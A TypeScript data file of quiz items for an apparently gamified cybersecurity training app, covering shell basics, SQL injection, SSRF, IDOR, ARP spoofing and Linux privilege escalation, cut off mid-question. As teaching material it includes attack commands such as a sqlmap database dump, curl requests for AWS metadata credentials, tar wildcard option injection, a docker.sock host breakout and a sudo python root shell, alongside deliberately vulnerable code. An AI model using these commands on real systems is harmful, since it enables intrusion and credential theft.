import { SkillModule } from '../types';
import { getSavedLanguage, Language } from '../utils/language';

export const SKILL_MODULES_EN: SkillModule[] = [
  {
    id: 'mod_basics_0',
    title: 'Module 0: Cyber Fundamentals & Command Terminal',
    certificationFocus: 'CompTIA Security+ SY0-701 & IT Fundamentals',
    color: '#06B6D4', // Cyan
    nodes: [
      {
        id: 'node_basics_1',
        title: 'Terminal Anatomy: pwd, ls & Directories',
        subtitle: 'First steps in Linux command line: directory navigation and elementary permissions',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 80,
        eloReward: 25,
        questions: [
          {
            id: 'q_basics_pwd',
            title: 'Verify Current Working Directory in Bash',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'You just opened a Linux shell. Which command prints the absolute path of the current working directory (Print Working Directory)?',
            options: [
              { id: 'bp_1', text: 'pwd', isCorrect: true },
              { id: 'bp_2', text: 'cd', isCorrect: false },
              { id: 'bp_3', text: 'whoami', isCorrect: false },
              { id: 'bp_4', text: 'echo $DIR', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Shell Basics: Command Navigation',
              whyItWorks: 'pwd (print working directory) prints the full absolute path of the current folder starting from root /.',
              patchRecommendation: 'Always use "pwd" to verify your path before executing commands with relative paths or destructive scripts.',
              terminalProof: '$ pwd\n/home/operator/recon'
            },
            xpReward: 40,
            eloReward: 12
          },
          {
            id: 'q_basics_spot_path',
            title: 'Spot the Bug: Path Syntax Error',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'The administrator wants to inspect the configuration file but receives "No such file or directory". TAP THE LINE with the invalid directory path:',
            codeLines: [
              { lineNum: 1, code: '#!/bin/bash' },
              { lineNum: 2, code: 'echo "=== System Inspection ==="' },
              { lineNum: 3, code: 'cat /etc/config/app_settings.conf', isVulnerable: true, vulnerabilityHint: 'The /etc/config directory does not exist: under the FHS standard, configurations reside in /etc/ or /etc/app/!' },
              { lineNum: 4, code: 'ls -la /var/log' }
            ],
            options: [
              { id: 'bs_1', text: 'Line 3: cat attempts to access non-existent directory /etc/config', isCorrect: true },
              { id: 'bs_2', text: 'Line 2: echo with equals signs is invalid in bash', isCorrect: false },
              { id: 'bs_3', text: 'Line 4: ls -la requires sudo privileges', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux FHS (Filesystem Hierarchy Standard)',
              whyItWorks: 'On Linux systems, global configurations reside directly under /etc. Always check file presence before referencing non-existent paths.',
              patchRecommendation: 'Verify file existence with `test -f` or `ls` before executing `cat`.',
              terminalProof: '$ cat /etc/config/app_settings.conf\ncat: /etc/config/app_settings.conf: No such file or directory'
            },
            xpReward: 40,
            eloReward: 13
          },
          {
            id: 'q_basics_terminal_ls',
            title: 'Terminal Sandbox: List Hidden Files',
            type: 'terminal_command',
            domain: 'Linux & Bash',
            difficulty: 'Beginner',
            prompt: 'Complete the "ls" command to display all files including hidden dotfiles (.bash_history) with extended file permissions:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'ls',
            commandTarget: 'ls -la',
            commandChips: ['-la', '-lh', '/tmp', '--color', '-R'],
            options: [
              { id: 'bl_1', text: '-la', isCorrect: true },
              { id: 'bl_2', text: '-R --color', isCorrect: false },
              { id: 'bl_3', text: '/tmp -lh', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Listing Directory Contents & Hidden Files',
              whyItWorks: 'The -a (all) flag includes files starting with "." and -l formats output with permissions, owner, and size.',
              patchRecommendation: 'Always inspect dotfiles (e.g. .env, .bash_history, .ssh) during initial reconnaissance audits.',
              terminalProof: '$ ls -la\ndrwxr-xr-x 2 operator operator 4096 Oct 17 10:00 .\n-rw------- 1 operator operator  512 Oct 17 10:05 .bash_history'
            },
            xpReward: 40,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_basics_2',
        title: 'Web & Protocols: How Data Travels',
        subtitle: 'HTTP vs HTTPS, standard ports (80 vs 443) and status codes (200, 404, 500)',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Networking',
        xpReward: 90,
        eloReward: 25,
        questions: [
          {
            id: 'q_basics_http_codes',
            title: 'HTTP Status Codes: Resource Not Found',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Which HTTP status code is returned by a web server when the client requests an endpoint or file that does not exist?',
            options: [
              { id: 'bh_1', text: '404 Not Found', isCorrect: true },
              { id: 'bh_2', text: '200 OK', isCorrect: false },
              { id: 'bh_3', text: '500 Internal Server Error', isCorrect: false },
              { id: 'bh_4', text: '301 Moved Permanently', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 9110: HTTP Status Codes Architecture',
              whyItWorks: 'The 4xx family denotes client-side errors: 404 specifies that the server received the request but the URI does not map to a resource.',
              patchRecommendation: 'Configure generic custom 404 pages that omit server banners, software versions, or internal paths.',
              terminalProof: '$ curl -I http://example.corp/secret.txt\nHTTP/1.1 404 Not Found\nServer: nginx'
            },
            xpReward: 45,
            eloReward: 12
          },
          {
            id: 'q_basics_https_port',
            title: 'Standard Web Ports: Security & Encryption',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Which standard TCP port is assigned to HTTPS (HTTP over TLS/SSL) to protect traffic against network sniffing and MitM attacks?',
            options: [
              { id: 'bp_port1', text: 'Port 443', isCorrect: true },
              { id: 'bp_port2', text: 'Port 80', isCorrect: false },
              { id: 'bp_port3', text: 'Port 22', isCorrect: false },
              { id: 'bp_port4', text: 'Port 8080', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IANA Well-Known Ports: Transport Layer Security',
              whyItWorks: 'Port 80 is reserved for plaintext HTTP (vulnerable to LAN sniffing); port 443 encapsulates HTTP inside a TLS encrypted tunnel.',
              patchRecommendation: 'Enforce automatic HTTP to HTTPS redirects and enable the Strict-Transport-Security (HSTS) header.',
              terminalProof: '$ nmap -p 80,443 target.corp\n80/tcp  open  http\n443/tcp open  ssl/https'
            },
            xpReward: 45,
            eloReward: 13
          },
          {
            id: 'q_basics_curl_check',
            title: 'Terminal Sandbox: Header Inspection with Curl',
            type: 'terminal_command',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'Complete the curl command to fetch only the HTTP response headers (without downloading the HTML body) from a remote server:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'curl',
            commandTarget: 'curl -I https://zeroday.gg',
            commandChips: ['-I https://zeroday.gg', '-X POST', '--data "test"', '-k -v', '-o /dev/null'],
            options: [
              { id: 'bch_1', text: '-I https://zeroday.gg', isCorrect: true },
              { id: 'bch_2', text: '-X POST -k', isCorrect: false },
              { id: 'bch_3', text: '--data "test" -o /dev/null', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'HTTP HEAD Request & Header Banner Grabbing',
              whyItWorks: 'The -I (--head) flag sends an HTTP HEAD request returning only response headers, ideal for rapid security header auditing.',
              patchRecommendation: 'Strip informative server headers such as Server: Apache/2.4.41 to restrict banner grabbing.',
              terminalProof: '$ curl -I https://zeroday.gg\nHTTP/2 200\ncontent-type: text/html\nstrict-transport-security: max-age=31536000'
            },
            xpReward: 45,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_basics_3',
        title: 'Password Security & Cryptographic Hashing',
        subtitle: 'Plaintext vs Cryptographic Hash (MD5, SHA-256) and the role of Salt',
        moduleId: 'mod_basics_0',
        status: 'available',
        domain: 'Cryptography',
        xpReward: 100,
        eloReward: 30,
        questions: [
          {
            id: 'q_basics_hashing_principle',
            title: 'Core Principles of Cryptographic Hashing',
            type: 'multiple_choice',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'Which key property distinguishes a cryptographic hash function (such as SHA-256) from a reversible encryption algorithm (such as AES)?',
            options: [
              { id: 'hp_1', text: 'Hashing is a one-way (irreversible) fixed-length mathematical function', isCorrect: true },
              { id: 'hp_2', text: 'Hashing requires a private key to decrypt the original input text', isCorrect: false },
              { id: 'hp_3', text: 'Hashing produces a longer output string as input length increases', isCorrect: false },
              { id: 'hp_4', text: 'Hashing functions only over active HTTPS network connections', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cryptographic Hash Functions: One-Way Property',
              whyItWorks: 'A cryptographic hash maps arbitrary-length inputs into a fixed-length bit string without allowing reconstruction of the original input (pre-image resistance).',
              patchRecommendation: 'For password storage, always use slow, memory-hard algorithms with salts (Argon2id, bcrypt, PBKDF2).',
              terminalProof: '$ echo -n "secret" | sha256sum\n2bb80e181c0399d8b7b2...  -'
            },
            xpReward: 50,
            eloReward: 15
          },
          {
            id: 'q_basics_spot_plaintext',
            title: 'Spot the Zero-Day: Plaintext Password Storage',
            type: 'spot_the_zeroday',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'This user registration controller stores accounts in the database. TAP THE VULNERABLE LINE that inserts raw plaintext passwords instead of producing a cryptographic hash:',
            codeLines: [
              { lineNum: 1, code: 'app.post("/register", async (req, res) => {' },
              { lineNum: 2, code: '    const { username, password, email } = req.body;' },
              { lineNum: 3, code: '    const userExists = await db.findUser(username);' },
              { lineNum: 4, code: '    if (userExists) return res.status(409).send("User exists");' },
              { lineNum: 5, code: '    await db.query("INSERT INTO users (username, password, email) VALUES ($1, $2, $3)", [username, password, email]);', isVulnerable: true, vulnerabilityHint: 'Password is inserted in raw plaintext without bcrypt or Argon2 hashing!' },
              { lineNum: 6, code: '    return res.status(201).json({ success: true });' },
              { lineNum: 7, code: '});' }
            ],
            options: [
              { id: 'spt_1', text: 'Line 5: direct database insertion of "password" parameter in plaintext', isCorrect: true },
              { id: 'spt_2', text: 'Line 2: unsafe object destructuring from req.body', isCorrect: false },
              { id: 'spt_3', text: 'Line 6: invalid return of HTTP 201 status code', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-256: Plaintext Storage of a Password',
              whyItWorks: 'Storing passwords in plaintext exposes all user credentials to immediate compromise upon database dump or SQL injection.',
              patchRecommendation: 'Execute `const hash = await bcrypt.hash(password, 12);` before the database INSERT query.',
              terminalProof: '$ psql -d app -c "SELECT username, password FROM users;"\nadmin | Password123!   <-- CRITICAL: Plaintext Password Leak!'
            },
            xpReward: 50,
            eloReward: 15
          },
          {
            id: 'q_basics_terminal_sha',
            title: 'Terminal Sandbox: SHA-256 Hash Computation',
            type: 'terminal_command',
            domain: 'Cryptography',
            difficulty: 'Beginner',
            prompt: 'Complete the Linux command pipeline to compute the SHA-256 digest of string "0xDAY_ROOT" without trailing newlines:',
            terminalPrompt: 'operator@cyberlab:~$',
            commandPrefix: 'echo -n "0xDAY_ROOT" |',
            commandTarget: 'echo -n "0xDAY_ROOT" | sha256sum',
            commandChips: ['sha256sum', 'md5sum', 'base64', 'wc -c', 'grep hash'],
            options: [
              { id: 'tsha_1', text: 'sha256sum', isCorrect: true },
              { id: 'tsha_2', text: 'base64 -d', isCorrect: false },
              { id: 'tsha_3', text: 'md5sum --check', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Cryptographic Digest Verification via Linux CLI',
              whyItWorks: 'sha256sum reads the byte stream from standard input and calculates the 256-bit digest (64 hex characters).',
              patchRecommendation: 'Regularly verify SHA-256 checksums of downloaded packages to guard against tampering.',
              terminalProof: '$ echo -n "0xDAY_ROOT" | sha256sum\nd04b5f9e8a71...  -'
            },
            xpReward: 50,
            eloReward: 15
          }
        ]
      }
    ]
  },
  {
    id: 'mod_web_sqli',
    title: 'Module 1: Web Hacking & OWASP Top 10',
    certificationFocus: 'CompTIA Security+ SY0-701 & CEH v13',
    color: '#10B981', // Emerald
    nodes: [
      {
        id: 'node_sqli_1',
        title: 'SQLi & Authentication Bypass',
        subtitle: 'Bypassing login forms via tautological injection and SQL comment truncation',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 120,
        eloReward: 35,
        questions: [
          {
            id: 'q_sqli_interactive',
            title: 'Spot the Zero-Day: SQLi Vulnerability in PHP Controller',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'Identify the line of source code that enables direct SQL Injection in the login controller. TAP THE FLAWED LINE:',
            codeLines: [
              { lineNum: 1, code: '<?php' },
              { lineNum: 2, code: 'function verifyLogin($pdo, $username, $password) {' },
              { lineNum: 3, code: '    $sanitizedUser = trim($username);' },
              { lineNum: 4, code: '    $sql = "SELECT * FROM users WHERE user=\'" . $sanitizedUser . "\' AND pass=\'" . md5($password) . "\'";', isVulnerable: true, vulnerabilityHint: 'Direct string concatenation without prepared statement parameters!' },
              { lineNum: 5, code: '    $stmt = $pdo->query($sql);' },
              { lineNum: 6, code: '    return $stmt->fetch();' },
              { lineNum: 7, code: '}' }
            ],
            options: [
              { id: 'o1', text: 'Line 3: trim() does not sanitize internal whitespaces', isCorrect: false },
              { id: 'o2', text: 'Line 4: Unparameterized string concatenation in SQL statement', isCorrect: true },
              { id: 'o3', text: 'Line 6: fetch() return exposes PDO internal connection object', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
              whyItWorks: 'The backend concatenates user input directly into SQL syntax. Supplying "admin\' -- -" comments out the password predicate.',
              patchRecommendation: 'Always enforce parameterized queries (PDO Prepared Statements with execute()).',
              terminalProof: '$ sqlmap -u "https://target.corp/login.php" --data="user=admin&pass=123" --dbs --batch\n[INFO] parameter \'user\' is vulnerable: admin\' OR 1=1-- -'
            },
            xpReward: 60,
            eloReward: 20
          },
          {
            id: 'q_terminal_sqlmap',
            title: 'Terminal Sandbox: Database Extraction via SQLMap',
            type: 'terminal_command',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Complete the sqlmap command to dump the production database users table:',
            terminalPrompt: 'pentester@kali:~$',
            commandPrefix: 'sqlmap -u "http://10.10.10.50/view.php?id=1" --batch',
            commandTarget: 'sqlmap -u "http://10.10.10.50/view.php?id=1" --batch -D production_db -T users --dump',
            commandChips: ['-D production_db', '-T users', '--dump', '--os-shell', '--threads 10', '-p id'],
            options: [
              { id: 't_c1', text: '-D production_db -T users --dump', isCorrect: true },
              { id: 't_c2', text: '--os-shell --threads 10', isCorrect: false },
              { id: 't_c3', text: '-T users -p id', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'SQL Automated Exploitation & Schema Dumping',
              whyItWorks: 'SQLMap automates blind/error-based extraction by querying information_schema and dumping table records.',
              patchRecommendation: 'Validate input using explicit integer casts `intval($_GET[\'id\'])` and prepared queries.',
              terminalProof: '$ sqlmap -u "http://10.10.10.50/view.php?id=1" -D production_db -T users --dump\n[+] 2 entries found: admin:$2y$10$... | guest:$2y$10$...'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sqli_2',
        title: 'SSRF & Cloud Metadata Exfiltration',
        subtitle: 'Exploiting Server-Side Request Forgery against AWS/GCP cloud metadata endpoints',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 140,
        eloReward: 40,
        questions: [
          {
            id: 'q_ssrf_aws',
            title: 'Spot the Zero-Day: Unvalidated URL Fetcher (SSRF)',
            type: 'spot_the_zeroday',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'This Node.js microservice downloads avatars from user-provided URLs. TAP THE VULNERABLE LINE that allows SSRF towards the 169.254.169.254 metadata service:',
            codeLines: [
              { lineNum: 1, code: 'app.post("/api/avatar/fetch", async (req, res) => {' },
              { lineNum: 2, code: '    const { imageUrl } = req.body;' },
              { lineNum: 3, code: '    if (!imageUrl) return res.status(400).send("Missing URL");' },
              { lineNum: 4, code: '    const response = await axios.get(imageUrl);', isVulnerable: true, vulnerabilityHint: 'Direct HTTP call to any URL including private IPs and cloud metadata!' },
              { lineNum: 5, code: '    res.setHeader("Content-Type", response.headers["content-type"]);' },
              { lineNum: 6, code: '    res.send(response.data);' },
              { lineNum: 7, code: '});' }
            ],
            options: [
              { id: 's_o1', text: 'Line 2: req.body is not sanitized with regex for special characters', isCorrect: false },
              { id: 's_o2', text: 'Line 4: axios.get(imageUrl) performs internal network calls without IP allowlists', isCorrect: true },
              { id: 's_o3', text: 'Line 6: res.send exposes the binary image buffer', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
              whyItWorks: 'The server acts as a proxy for the attacker, enabling requests to link-local address `http://169.254.169.254/latest/meta-data/` to harvest IAM tokens.',
              patchRecommendation: 'Validate URLs against an allowlist, reject RFC 1918 private ranges, and enforce AWS IMDSv2.',
              terminalProof: '$ curl -X POST -d \'{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin"}\' https://target/api/avatar/fetch\n{"AccessKeyId":"AKIA...", "SecretAccessKey":"v0x..."}'
            },
            xpReward: 70,
            eloReward: 20
          },
          {
            id: 'q_ssrf_terminal',
            title: 'Terminal Sandbox: Curl Exploit on IMDSv1',
            type: 'terminal_command',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'Complete the curl command to extract IAM role credentials from the AWS metadata endpoint:',
            terminalPrompt: 'attacker@c2-box:~$',
            commandPrefix: 'curl -s http://169.254.169.254/latest/meta-data/',
            commandTarget: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role',
            commandChips: ['iam/security-credentials/ec2-role', 'public-keys/0/openssh-key', 'placement/availability-zone', '--head', '-X POST'],
            options: [
              { id: 'opt_imds_1', text: 'iam/security-credentials/ec2-role', isCorrect: true },
              { id: 'opt_imds_2', text: 'placement/availability-zone', isCorrect: false },
              { id: 'opt_imds_3', text: 'public-keys/0/openssh-key', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'AWS EC2 Instance Metadata Service v1 Abuse',
              whyItWorks: 'IMDSv1 responds to unauthenticated GET requests originating from the internal host.',
              patchRecommendation: 'Disable IMDSv1 and enforce IMDSv2 session tokens via PUT.',
              terminalProof: '$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role\n{\n  "Code" : "Success",\n  "Type" : "AWS-HMAC",\n  "AccessKeyId" : "ASIAV..."\n}'
            },
            xpReward: 70,
            eloReward: 20
          }
        ]
      },
      {
        id: 'node_sqli_3',
        title: 'IDOR & API Authorization Flaws',
        subtitle: 'Bypassing BOLA / Broken Object Level Authorization on REST APIs',
        moduleId: 'mod_web_sqli',
        status: 'available',
        domain: 'Web Sec',
        xpReward: 150,
        eloReward: 45,
        questions: [
          {
            id: 'q_idor_api',
            title: 'API Analysis: Broken Object Level Authorization (BOLA)',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'A user with id: 8820 intercepts the REST API call to modify account settings. Why does this represent a critical IDOR?',
            codeSnippet: `PUT /api/v2/users/1001/settings HTTP/1.1
Host: api.zeroday-banking.corp
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInN1YiI6Ijg4MjAifQ...
Content-Type: application/json

{
  "email": "attacker@pwned.com",
  "role": "super_admin",
  "mfa_enabled": false
}`,
            options: [
              { id: 'idor_1', text: 'The JWT belongs to user 8820, but the endpoint updates user 1001 without checking subject ownership against the path parameter', isCorrect: true },
              { id: 'idor_2', text: 'The Content-Type header must be application/x-www-form-urlencoded', isCorrect: false },
              { id: 'idor_3', text: 'The PUT method is not permitted by RFC HTTP specifications', isCorrect: false },
              { id: 'idor_4', text: 'The JSON payload exceeds the maximum size of 1024 bytes', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization',
              whyItWorks: 'The backend verifies token signature but fails to check authorization between token subject (sub: 8820) and target resource in path (/users/1001).',
              patchRecommendation: 'Enforce contextual authorization: `if (currentUser.id !== targetUserId && !currentUser.isAdmin) throw new ForbiddenError()`.',
              terminalProof: '$ curl -X PUT -H "Authorization: Bearer $USER_TOKEN" https://api.target/api/v2/users/1001/settings -d \'{"role":"admin"}\'\nHTTP/1.1 200 OK -> {"status":"user 1001 updated"}'
            },
            xpReward: 75,
            eloReward: 25
          }
        ]
      }
    ]
  },
  {
    id: 'mod_networking',
    title: 'Module 2: Networking & Packet Dissection',
    certificationFocus: 'Cisco CCNA 200-301 & CompTIA Network+',
    color: '#06B6D4', // Cyan
    nodes: [
      {
        id: 'node_net_1',
        title: 'CIDR Subnetting & IP Route Matching',
        subtitle: 'Real-time calculation of subnet masks, host ranges, and broadcast addresses',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 110,
        eloReward: 30,
        questions: [
          {
            id: 'q_subnet_1',
            title: 'CIDR Analysis: Broadcast Address Calculation',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Given host IP 172.24.115.68 with subnet mask /22 (255.255.252.0), what is the valid directed BROADCAST address for this subnet segment?',
            codeSnippet: `Host IP: 172.24.115.68
Subnet Mask: 255.255.252.0 (/22)
3rd Octet: 115 = 01110011 (binary)
3rd Octet Mask: 252 = 11111100 (binary)`,
            options: [
              { id: 's1', text: '172.24.115.255', isCorrect: true },
              { id: 's2', text: '172.24.112.255', isCorrect: false },
              { id: 's3', text: '172.24.116.0', isCorrect: false },
              { id: 's4', text: '172.24.127.255', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 1519 / Classless Inter-Domain Routing (CIDR) Subnet Math',
              whyItWorks: 'With /22, 10 bits remain for the host space. The 3rd octet block increment is 4 (256-252). Block: 112 to 115. Broadcast: 172.24.115.255.',
              patchRecommendation: 'Configure accurate routing tables and subnet masks to prevent blackholing packets.',
              terminalProof: '$ ipcalc 172.24.115.68/22\nBroadcast: 172.24.115.255'
            },
            xpReward: 55,
            eloReward: 15
          },
          {
            id: 'q_subnet_26',
            title: 'Fast /26 Subnet Calculation: Maximum Usable Hosts',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Beginner',
            prompt: 'How many valid, assignable host IP addresses are available in an IPv4 subnet with CIDR prefix /26 (mask 255.255.255.192)?',
            codeSnippet: `Network Prefix: 26 bits
Host Bits Remaining: 32 - 26 = 6 bits
Total IP Addresses: 2^6 = 64 addresses`,
            options: [
              { id: 'sub_a', text: '62 usable hosts (64 total minus Network ID and Broadcast)', isCorrect: true },
              { id: 'sub_b', text: '64 usable hosts', isCorrect: false },
              { id: 'sub_c', text: '30 usable hosts', isCorrect: false },
              { id: 'sub_d', text: '126 usable hosts', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IPv4 Address Architecture & Usable Host Calculation',
              whyItWorks: 'Each subnet reserves the first address (host bits all 0) as Network ID and last address (host bits all 1) as Directed Broadcast.',
              patchRecommendation: 'Allocate subnets scaled to host requirements to prevent address space exhaustion.',
              terminalProof: '$ ipcalc 192.168.1.0/26 | grep Hosts\nHosts/Net: 62'
            },
            xpReward: 55,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_net_2',
        title: 'ARP Poisoning & MitM Extraction',
        subtitle: 'Injecting gratuitous ARP frames and hijacking default gateways',
        moduleId: 'mod_networking',
        status: 'available',
        domain: 'Networking',
        xpReward: 130,
        eloReward: 35,
        questions: [
          {
            id: 'q_arp_terminal',
            title: 'Terminal Sandbox: Enable IP Forwarding for Arpspoof',
            type: 'terminal_command',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Complete the command to enable Linux kernel IP packet routing (essential to avoid dropping packets during a Man-in-the-Middle attack):',
            terminalPrompt: 'root@kali:~#',
            commandPrefix: 'echo 1 >',
            commandTarget: 'echo 1 > /proc/sys/net/ipv4/ip_forward',
            commandChips: ['/proc/sys/net/ipv4/ip_forward', '/etc/network/interfaces', '/var/log/syslog', '--force', 'iptables -F'],
            options: [
              { id: 'arp_opt1', text: '/proc/sys/net/ipv4/ip_forward', isCorrect: true },
              { id: 'arp_opt2', text: '/etc/network/interfaces', isCorrect: false },
              { id: 'arp_opt3', text: 'iptables -F', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-300: Channel Accessible by Non-Endpoint (Man-in-the-Middle via ARP Spoofing)',
              whyItWorks: 'ARP is unauthenticated. By sending gratuitous ARP replies impersonating the gateway, the victim updates its cache with the attacker MAC.',
              patchRecommendation: 'Configure Dynamic ARP Inspection (DAI) and DHCP Snooping on managed enterprise switches.',
              terminalProof: 'root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\nroot@kali:~# arpspoof -i eth0 -t 192.168.1.50 192.168.1.1\n0:c:29:4f:8e:12 0:50:56:c0:0:8 0806 42: arp reply 192.168.1.1 is-at 0:c:29:4f:8e:12'
            },
            xpReward: 65,
            eloReward: 20
          }
        ]
      }
    ]
  },
  {
    id: 'mod_linux',
    title: 'Module 3: Linux Kernel & PrivEsc',
    certificationFocus: 'OSCP & CompTIA Linux+ XK0-005',
    color: '#6366F1', // Indigo
    nodes: [
      {
        id: 'node_lin_1',
        title: 'Wildcard Injection & Cron Exploits',
        subtitle: 'Exploiting tar and rsync commands invoked with wildcards (*) inside root crontabs',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 130,
        eloReward: 35,
        questions: [
          {
            id: 'q_tar_wildcard',
            title: 'Spot the Zero-Day: Argument Injection via Tar Wildcard',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'In the root cron script below, the shell expands wildcards dangerously. TAP THE LINE that enables arbitrary code execution as root:',
            codeLines: [
              { lineNum: 1, code: '#!/bin/bash' },
              { lineNum: 2, code: '# Nightly automated backup' },
              { lineNum: 3, code: 'cd /var/www/uploads || exit 1' },
              { lineNum: 4, code: 'tar -czf /backups/uploads.tar.gz *', isVulnerable: true, vulnerabilityHint: 'Wildcard * expands filenames such as --checkpoint=1 and --checkpoint-action=exec=shell.sh!' },
              { lineNum: 5, code: 'chmod 600 /backups/uploads.tar.gz' }
            ],
            options: [
              { id: 't1', text: 'Line 3: || exit 1 causes denial of service on cron daemon', isCorrect: false },
              { id: 't2', text: 'Line 4: Expanding * allows arbitrary command-line arguments to be passed to tar', isCorrect: true },
              { id: 't3', text: 'Line 5: chmod 600 does not protect against group privileges', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Unix Wildcard Injection / Tar Arbitrary Command Execution',
              whyItWorks: 'Creating files named `--checkpoint=1` and `--checkpoint-action=exec=sh pwn.sh` forces tar to parse them as options rather than filenames.',
              patchRecommendation: 'Never use wildcards in privileged scripts. Use `-- ./*` to signal the end of command-line flags.',
              terminalProof: '$ touch "/var/www/uploads/--checkpoint=1"\n$ touch "/var/www/uploads/--checkpoint-action=exec=sh pwn.sh"\n# id\nuid=0(root) gid=0(root)'
            },
            xpReward: 65,
            eloReward: 20
          },
          {
            id: 'q_docker_socket',
            title: 'Spot the Zero-Day: Docker Socket Breakout',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'You are inspecting a docker-compose.yml file for a monitoring agent. TAP THE LINE that allows a compromised container user to take over the host system:',
            codeLines: [
              { lineNum: 1, code: 'version: "3.8"' },
              { lineNum: 2, code: 'services:' },
              { lineNum: 3, code: '  monitor:' },
              { lineNum: 4, code: '    image: datadog/agent:latest' },
              { lineNum: 5, code: '    volumes:' },
              { lineNum: 6, code: '      - /var/run/docker.sock:/var/run/docker.sock', isVulnerable: true, vulnerabilityHint: 'Mounting docker.sock permits communicating directly with the root Docker daemon on the host!' },
              { lineNum: 7, code: '      - /proc:/host/proc:ro' }
            ],
            options: [
              { id: 'd_opt1', text: 'Line 4: datadog/agent image has not been patched for CVEs', isCorrect: false },
              { id: 'd_opt2', text: 'Line 6: Mounting /var/run/docker.sock allows spawning privileged containers with host root filesystem mounts', isCorrect: true },
              { id: 'd_opt3', text: 'Line 7: Read-only mount of /proc leaks RAM passwords', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Docker Daemon UNIX Socket Exposure (Host Takeover)',
              whyItWorks: 'Any entity with access to docker.sock can order dockerd (running as root) to launch a container mounting the host root filesystem `/` into `/host` and chroot.',
              patchRecommendation: 'Never mount docker.sock inside untrusted workloads; deploy rootless Docker where possible.',
              terminalProof: '$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash\n# whoami\nroot'
            },
            xpReward: 75,
            eloReward: 25
          }
        ]
      },
      {
        id: 'node_lin_2',
        title: 'Sudoers Misconfiguration & GTFOBins',
        subtitle: 'Bypassing sudo NOPASSWD directives lacking shell escape restrictions',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 140,
        eloReward: 40,
        questions: [
          {
            id: 'q_sudo_terminal',
            title: 'Terminal Sandbox: Shell Escape with Python3 Sudo',
            type: 'terminal_command',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Command `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/python3`. Complete the command to spawn an interactive root shell:',
            terminalPrompt: 'devuser@target:~$',
            commandPrefix: 'sudo python3 -c',
            commandTarget: 'sudo python3 -c \'import pty; pty.spawn("/bin/bash")\'',
            commandChips: ['\'import pty; pty.spawn("/bin/bash")\'', '\'import os; os.system("id")\'', '\'print("hello")\'', '--version', '-m http.server'],
            options: [
              { id: 'sudo_1', text: '\'import pty; pty.spawn("/bin/bash")\'', isCorrect: true },
